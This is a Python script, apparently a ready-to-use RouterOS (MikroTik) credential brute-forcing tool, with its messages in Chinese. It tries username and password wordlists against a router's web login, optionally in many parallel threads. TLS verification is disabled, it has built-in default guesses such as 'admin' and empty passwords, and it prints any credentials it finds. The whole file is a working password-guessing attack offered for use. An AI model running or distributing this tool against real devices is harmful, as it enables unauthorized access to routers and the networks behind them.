#!/usr/bin/env python3
import requests
import sys
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
urllib3.disable_warnings()

class RouterOSDictBrute:
    def __init__(self, target, timeout=10):
        self.target = target.rstrip("/")
        self.timeout = timeout
    
    def load_dict(self, filename):
        try:
            with open(filename) as f:
                return [line.strip() for line in f if line.strip() and not line.startswith("#")]
        except FileNotFoundError:
            print("[-] 文件不存在: " + filename)
            sys.exit(1)
    
    def try_login(self, username, password):
        try:
            resp = requests.get(self.target, auth=(username, password), 
                              timeout=self.timeout, verify=False, allow_redirects=False)
            if resp.status_code == 200:
                return True
            if resp.status_code == 302 and "login" not in resp.headers.get("Location", "").lower():
                return True
        except:
            pass
        return False
    
    def brute_force(self, usernames, passwords, parallel=False, workers=10):
        total = len(usernames) * len(passwords)
        print("\n[+] 目标: " + self.target)
        print("[+] 用户名: %d 个" % len(usernames))
        print("[+] 密码: %d 个" % len(passwords))
        print("[+] 总尝试: %d 次" % total)
        mode = "并发(" + str(workers) + "线程)" if parallel else "串行"
        print("[+] 模式: " + mode + "\n")
        
        results = []
        tried = 0
        
        if parallel:
            with ThreadPoolExecutor(max_workers=workers) as executor:
                futures = {}
                for username in usernames:
                    for password in passwords:
                        future = executor.submit(self.try_login, username, password)
                        futures[future] = (username, password)
                
                for future in as_completed(futures):
                    username, password = futures[future]
                    tried += 1
                    try:
                        if future.result():
                            pwd = password if password else "(空)"
                            print("[+++ %d/%d] 成功! %s:%s" % (tried, total, username, pwd))
                            results.append({"username": username, "password": password})
                            for f in futures:
                                f.cancel()
                            break
                        else:
                            if tried % 100 == 0:
                                print("[*] 进度: %d/%d (%d%%)" % (tried, total, tried*100//total))
                    except:
                        pass
        else:
            for username in usernames:
                for password in passwords:
                    tried += 1
                    pwd = password if password else "(空)"
                    print("[%d/%d] %s:%s " % (tried, total, username, pwd), end="", flush=True)
                    if self.try_login(username, password):
                        print("✓ 成功!")
                        results.append({"username": username, "password": password})
                        return results
                    else:
                        print("✗")
        return results

def main():
    import argparse
    parser = argparse.ArgumentParser(description="RouterOS 字典爆破")
    parser.add_argument("target", help="目标URL")
    parser.add_argument("-u", "--users", help="用户名字典")
    parser.add_argument("-p", "--passwords", help="密码字典")
    parser.add_argument("-U", "--username", help="单个用户名")
    parser.add_argument("-P", "--password-list", help="密码列表(逗号分隔)")
    parser.add_argument("--parallel", action="store_true", help="并发模式")
    parser.add_argument("-w", "--workers", type=int, default=20, help="线程数")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="超时")
    
    args = parser.parse_args()
    bruter = RouterOSDictBrute(args.target, timeout=args.timeout)
    
    if args.username:
        usernames = [args.username]
    elif args.users:
        usernames = bruter.load_dict(args.users)
    else:
        usernames = ["admin", "root", "user"]
    
    if args.password_list:
        passwords = args.password_list.split(",")
    elif args.passwords:
        passwords = bruter.load_dict(args.passwords)
    else:
        passwords = ["", "admin", "password", "1234", "12345", "123456"]
    
    results = bruter.brute_force(usernames, passwords, args.parallel, args.workers)
    
    print("\n" + "="*60)
    if results:
        print("成功! 找到凭据:")
        for r in results:
            print("  用户: " + r["username"])
            print("  密码: " + r["password"])
        sys.exit(0)
    else:
        print("失败!")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        main()
    else:
        print("[+] RouterOS 字典爆破工具")
        print("[+] 用法: python3 routeros_dict_brute.py http://target -u users.txt -p pass.txt --parallel")
